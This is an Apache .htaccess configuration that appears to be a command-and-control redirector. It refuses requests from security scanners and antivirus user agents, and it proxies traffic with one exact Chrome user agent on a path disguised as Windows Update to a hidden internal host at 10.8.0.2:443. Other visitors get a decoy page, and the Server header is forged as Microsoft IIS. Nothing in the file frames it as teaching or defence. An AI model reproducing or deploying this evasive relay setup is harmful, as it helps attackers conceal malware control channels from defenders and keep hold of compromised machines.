RewriteEngine On
RewriteBase /

<Limit GET POST>
    Order Allow,Deny
    Allow from all
</Limit>

RewriteCond %{HTTP_USER_AGENT} ^.*(nmap|nikto|nessus|qualys|acunetix|dirbuster|sqlmap|censys|shodan|zgrab|masscan|curl|wget|python|libwww-perl|go-http-client|kaspersky|avast|bitdefender).* [NC]
RewriteRule ^.*$ - [F,L]

RewriteCond %{HTTP_USER_AGENT} ^Mozilla/5.0\ \(Windows\ NT\ 10.0;\ Win64;\ x64\)\ Chrome/121.0.0.0 [NC]
RewriteCond %{REQUEST_URI} ^/msdownload/update/v3/static/.* [NC]
RewriteRule ^(.*)$ http://10.8.0.2:443/$1 [P,L,NE]

RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^.*$ index.html [L]

<IfModule mod_headers.c>
    Header unset X-Powered-By
    Header unset Server
    Header unset X-AspNet-Version
    Header set Server "Microsoft-IIS/10.0"
    Header set X-Content-Type-Options "nosniff"
    Header set X-Frame-Options "SAMEORIGIN"
    Header set X-XSS-Protection "1; mode=block"
    Header set Strict-Transport-Security "max-age=31536000; includeSubDomains"
    Header set X-CCC "Internal"
    Header set X-CID "MS"
</IfModule>

<Files ".htaccess">
    Order allow,deny
    Deny from all
</Files>
